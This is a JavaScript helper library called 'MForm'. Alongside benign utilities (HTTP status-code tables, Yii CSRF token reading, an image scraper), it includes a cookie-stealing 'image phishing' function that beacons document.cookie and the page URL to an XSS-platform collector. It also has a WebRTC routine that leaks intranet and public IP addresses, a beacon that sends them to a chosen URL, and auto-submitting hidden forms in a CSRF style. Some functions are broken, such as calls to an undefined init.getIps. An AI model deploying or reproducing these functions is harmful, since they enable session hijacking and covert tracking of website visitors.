//全局变量(多变操作)
var MInfo ;
//表单构建 方法
var MForm = function () {
    //私用的方法或者属性保存在that上
    var that = this ;

    //内部code提示
    that.errorCodeBase = function (httpCode) {
        var allCode =  {
            "1xx":{
                "100":"继续",
                "101":"交换协议",
                "102":"处理"
            },
            "2xx":{
                "200":"好的",
                "201":"创建",
                "202":"接受",
                "203":"非权威信息",
                "204":"没有内容",
                "205":"重置内容",
                "206":"部分内容",
                "207":"多状态",
                "208":"已经报告",
                "226":"IM已使用"
            },
            "3xx":{
                "300":"多种选择",
                "301":"永久移动",
                "302":"发现",
                "303":"见其他",
                "304":"未修改",
                "305":"使用代理",
                "307":"临时重定向",
                "308":"永久重定向"
            },
            "4xx":{
                "400":"错误请求",
                "401":"未经授权",
                "402":"需要付款",
                "403":"禁止",
                "404":"未找到",
                "405":"方法不允许",
                "406":"不可接受",
                "407":"需要代理验证",
                "408":"请求超时",
                "409":"冲突",
                "410":"已经过去了",
                "411":"所需长度",
                "412":"前提条件失败",
                "413":"有效载荷过大",
                "414":"Request-URI太长",
                "415":"不支持的媒体类型",
                "416":"请求的范围不满意",
                "417":"期望失败",
                "418":"我是一个茶壶",
                "421":"误导请求",
                "422":"不可处理的实体",
                "423":"已锁定",
                "424":"依赖关系失败",
                "426":"需要升级",
                "428":"必备前提条件",
                "429":"请求太多",
                "431":"请求标头字段太大",
                "444":"连接已关闭但没有响应",
                "451":"因法律原因不可用",
                "499":"客户关闭请求"
            },
            "5xx":{
                "500":"内部服务器错误",
                "501":"未实施",
                "502":"BadGateway",
                "503":"服务不可用",
                "504":"网关超时",
                "505":"不支持HTTP版本",
                "506":"Variant也谈判",
                "507":"存储空间不足",
                "508":"检测到环路",
                "510":"未扩展",
                "511":"需要网络验证",
                "599":"网络连接超时错误"
            }
        };
        var firstCode = httpCode[0] ;
        var msgCode = allCode[firstCode+'xx'][httpCode] ;
        if(msgCode) {
            var backCode ={};
            backCode[httpCode] = msgCode ;
            console.log(backCode)
        }else {
            console.log(allCode);
        }
    };

    //ip获取
    that.getIps  = function (callback) {
        var ip_dups = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var useWebKit = !!window.webkitRTCPeerConnection;
        if (!RTCPeerConnection) {
            var win = iframe.contentWindow;
            RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
            useWebKit = !!win.webkitRTCPeerConnection;
        }
        var mediaConstraints = {
            optional: [{
                RtpDataChannels: true
            }]
        };
        var servers = {
            iceServers: [{
                urls: "stun:stun.services.mozilla.com"
            }]
        };
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        function handleCandidate(candidate) {
            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
            var ip_addr = ip_regex.exec(candidate)[1];
            if (ip_dups[ip_addr] === undefined) callback(ip_addr);
            ip_dups[ip_addr] = true;
        }
        pc.onicecandidate = function(ice) {
            if (ice.candidate) handleCandidate(ice.candidate.candidate);
        };
        pc.createDataChannel("");
        pc.createOffer(function(result) {
                pc.setLocalDescription(result,
                    function() {},
                    function() {});

            },
            function() {});
        setTimeout(function() {
                var lines = pc.localDescription.sdp.split('\n');
                lines.forEach(function(line) {
                    if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
                });
            },
            1000);
    };

    //基础信息
    var init = {
        'name': 'form build' ,
        'version':'1.0.1',
        'author': 'sjm',
        'params': 'MInfo',
        'function': 'MForm'
    } ;

    //更多提示信息
    init.more = function () {
        console.log("更多插件相关：https://developer.chrome.com/extensions （你将有机会变成插件高手!）");
    } ;

    //月份
    init.month = function (one) {
        var month = {
            "Jan":"一月 Jan January","Feb":"二月 Feb February","Mar":" 三月 Mar March",
            "Apr ":" 四月 Apr April","May ":" 五月 May  May","Jun":" 六月 Jun June",
            "Jul":" 七月 Jul July","Aug ":" 八月 Aug August","Sept":" 九月 Sept September",
            "Oct":"十月 Oct October","Nov":" 十一月 Nov November","Dec " :" 十二月 Dec December"
        };
        if(one && month[one]) {
            init.error(month[one],200);
        }else {
            console.log(month);
        }
    };

    //基础提示
    init.errorCode = function (httpCode) {
        var code = {
            "1xx": "1xx消息", "2xx": "2xx成功", "3xx": "3xx重定向", "4xx": "4xx客户端错误|请求错误", "5xx": "5xx服务器错误"
        };
        if (httpCode) {
            that.errorCodeBase(httpCode.toString());
        } else {
            console.log(code);
        }
    };

    //错误信息提示  外部代码需要return终止
    init.error = function (msg,code) {
        if(!code) code = 400 ;
        if(!msg)  msg  = 'error';
        console.log({"code":code,"message":msg});
    };
    
    //yii csrf验证
    init.frame = function (data,frame) {
        switch(frame) {
            case 'yii' :
                var length = document.getElementsByName('csrf-token').length ;
                if(length === 1) {
                    data['_csrf'] = document.getElementsByName('csrf-token')[0].content;
                }
                return data ;
            default :
                return data ;
        }
    };

    //yii获取csrf
    init.yiiCsrf = function (cs_rf_key) {
        if(!cs_rf_key) cs_rf_key ='csrf-token';
        var length = document.getElementsByName(cs_rf_key).length ;
        if(length === 1) {
           return document.getElementsByName(cs_rf_key)[0].content;
        }
        return null ;
    };

    /**
     *  通过dom构建表单
     * @param hidData Object { 'alipay_account': 'show tables ;'} ;
     * @param url
     * @param frame
     * @param method
     */
    init.dom = function (hidData,url,frame,method) {
        if(!hidData) return ;
        if(!method) method = 'post' ;
        if(frame) {
            hidData = init.frame(hidData,frame) ;
        }
        var f = document.createElement("form");
        document.body.appendChild(f);
        for( var i in hidData ) {
            var temp = document.createElement("input");
            temp.type = "hidden";
            f.appendChild(temp);
            temp.value = hidData[i];
            temp.name = i ;
        }
        /*JSON.stringify()
        JSON.parse()*/
        f.action = url;
        f.method = method;
        f.submit();
    };

    //设置 header 表单
    init.herderDom = function (data,url,header,frame,method) {
        if(!data)   return ;
        if(!method) method = 'POST';
        //xml对象
        var xmlhttp = new XMLHttpRequest();
        //目标地址
        xmlhttp.open(method, url,true);
        //设置header
        if(header) {
            for( var i in header ) {
                xmlhttp.setRequestHeader(i, header[i]);
            }
        }
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        if(frame) {
            data = init.frame(data,frame) ;
        }
        //数据设置
        var content = '';
        for (var d in data) {
            content += '&'+d+'='+data[d] ;
        }
        xmlhttp.send(content) ; //内容格式根据Content-type设置的格式而定
        xmlhttp.onreadystatechange = function(){
            if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
                //成功
                console.log(xmlhttp.responseText);
            }
        }
    };

    //自动登录 当设置了MInfo的值后 调用auto自动登录
    init.auto = function () {
        if(!MInfo) {
           init.error('无效的 MInfo');
           return ;
        }
        if(!MInfo['data'] || !MInfo['url']) {
            init.error('MInfo 必须拥有 data 和 url 属性');
            return ;
        }
        init.dom(MInfo['data'],MInfo['url']);
    };

    //打印
    init.dd = function (d) {
        if(!d) {
            init.error('请输入打印信息!');
            return ;
        }
        return console.log(d);
    };

    //图片钓鱼
    init.imgFish = function () {
        var img = new Image();
        img.src= 'http://localhost:20002/xss.php?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie) ;
        init.error('图片钓鱼发送成功!',200);
    };

    //获取内网ip
    init.ipIn  = function () {
        that.getIps(function (ip) {
            console.log('intranet ip : '+ip);
        });
    };

    //获取外网ip
    init.ipOut = function () {
        that.getIps(function (ip) {
            console.log('public net ip : '+ip);
        });
    };

    //自动发送
    init.autoSent = function (url) {
        if(!url) return ;
        init.getIps(function (ip) {
            (new Image()).src = url+'?do=api&id={projectId}&location='
                + escape(
                    (function(){
                        try {
                            return document.location.href
                        } catch(e) {
                            return ''
                        }
                    })()
                ) + '&ip=' + ip;
        }
            );
    };

    //获取小红书图片
    init.getXHSImg = function () {

        var count = document.getElementsByClassName('slide')[0].childElementCount;
        var imgHtml = '';
        for(var i = 0; i < count; i ++) {

            var str = document.getElementsByClassName('slide')[0].children[i].innerHTML;

            var strArr= new Array();
            strArr=str.split("ci.xiaohongshu.com/");

            var imgPartArr = [];
            imgPartArr = strArr[1].split("?");

            var imgUrl = "https://ci.xiaohongshu.com/"+imgPartArr[0];

            imgHtml += "<img style='margin: 15px' src='"+imgUrl+"'> <div style='margin: 10px'><div>";
            console.log(imgUrl)
        }
        var nwin = window.open(''); //新开空白标签页
        nwin.document.write(imgHtml); //将内容写入新标签页
    };

    //浏览器消息通知
    /*if(window.Notification && Notification.permission !== "denied") {
        Notification.requestPermission(function(status) {
            var n = new Notification('通知标题', { body: '有消息啦！' });
        });
    }*/

    return init ;
}();